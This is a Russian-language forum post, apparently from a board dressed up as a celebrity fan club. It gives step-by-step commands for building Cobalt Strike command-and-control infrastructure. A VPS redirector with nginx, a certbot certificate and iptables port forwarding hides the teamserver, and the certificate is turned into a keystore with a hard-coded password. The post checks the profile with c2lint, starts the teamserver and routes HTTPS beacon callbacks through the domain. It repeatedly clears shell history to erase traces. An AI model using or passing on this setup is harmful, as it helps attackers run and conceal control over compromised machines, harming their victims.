@@ -1,0 +1,114 @@
+
+
+    Vampir
+    Новые темы
+    Новые ответы
+
+    Начало
+    Помощь
+    Поиск
+    Профиль
+    Личные сообщения
+    Пользователи
+
+Monica Bellucci Fan Club
+
+    Monica Bellucci Fan Club »
+    Frameworks »
+    Cobalt Strike »
+    Настройка TeamServer
+
+Настройка TeamServer
+asdf7f814vycfas · 1 · 24
+« предыдущая тема следующая тема »
+
+Страницы: 1
+asdf7f814vycfas
+
+    Users
+    Member
+    *
+        2
+        Просмотр профиля E-mail Личное сообщение (Оффлайн) 
+
+: Марта 01, 2021, 04:37:44 pm
+Записан
+
+Необходимы 2 сервера + домен:
+1) Сервер Ubuntu, 16-24gb, 500gb sata
+2) Сервер(VPS) Ubuntu, 4gb,50gb sata
+
+Настройка 2 сервера прокладки:
+   -sudo apt-get update && apt-get upgrade
+   -sudo apt-get install nginx
+Направляем купленный домен на ip сервера.
+Делаем директории var/www/domain.com и создаем конфиг под домен:
+   sudo nano /etc/nginx/sites-available/domain.com:
+
+Код: [Выделить]
+
+server {
+  listen 80 default_server;
+  listen [::]:80 default_server;  root /var/www/domain.com;  index index.html;  server_name domain.com www.domain.com; 
+
+location / {
+	try_files $uri $uri/ =404;
+  }
+}
+
+   -ln -s /etc/nginx/sites-available/domain.com /etc/nginx/sites-enabled/domain.com
+Удаляем default конфиги в /etc/nginx/sites-available и /etc/nginx/sites-enabled
+   -sudo systemctl restart nginx
+Получаем ssl:
+   -sudo add-apt-repository ppa:certbot/certbot
+   -sudo apt-get update
+   -sudo apt-get install python-certbot-nginx
+   -sudo systemctl reload nginx
+   -sudo certbot --nginx -d domain.com -d www.domain.com
+   -sudo certbot renew --dry-run
+   -sudo systemctl restart nginx
+Прописываем редирект трафика:
+   -iptables -I INPUT -p tcp -m tcp --dport 443 -j ACCEPT
+   -iptables -t nat -A PREROUTING -p tcp --dport 443 -j DNAT --to-destination 1_server_ip:443
+   -iptables -t nat -A POSTROUTING -j MASQUERADE
+   -iptables -I FORWARD -j ACCEPT
+   -iptables -P FORWARD ACCEPT
+   -sysctl net.ipv4.ip_forward=1
+   -history -c
+   
+Заходим на 1 сервер с кобальтом:
+   -sudo apt-get update && apt-get upgrade
+   -sudo apt-get install screen
+   -sudo apt-get install default-jdk
+Копируем Cobalt в папку /root предварительно сменив порт на любой в teamserver, далее по ssh:
+   -sudo chmod +x teamserver
+   -sudo chmod +x c2lint
+Далее заходим в /etc/ssl и перемещаем SSL файлы с того сервера:
+   -openssl pkcs12 -export -in certificate.pem -inkey domain.com.key -out domain.com.p12 -name domain.com -passout pass:tYidn8
+   -keytool -importkeystore -deststorepass tYidn8 -destkeypass tYidn8 -destkeystore domain.com.store -srckeystore domain.com.p12 -srcstoretype PKCS12 -srcstorepass tYidn8 -alias domain.com
+В результате этих команд появится файл domain.com.store, копируем его в папку /root/Cobalt
+Меняем в xxxx.prorfile наш домен.
+   -sudo ./c2lint xxxx.profile
+   -sudo screen
+   -cd /root/Cobalt
+   -sudo ./teamserver ip password /root/Cobalt/xxxx.profile
+Выходим из скрина ctrl+A затем D
+   -history -c
+   
+Таким образом настроена связка из 2 серверов, далее создаем обычный HTTPS listener и направляем callback на domain.com
+
+Страницы: 1
+
+    Monica Bellucci Fan Club »
+    Frameworks »
+    Cobalt Strike »
+    Настройка TeamServer
+
+Перейти в:
+ 
++ Быстрый ответ
+
+    SMF 2.0.18 | SMF © 2020, Simple Machines
+    Разработанно с от SychO
+
+
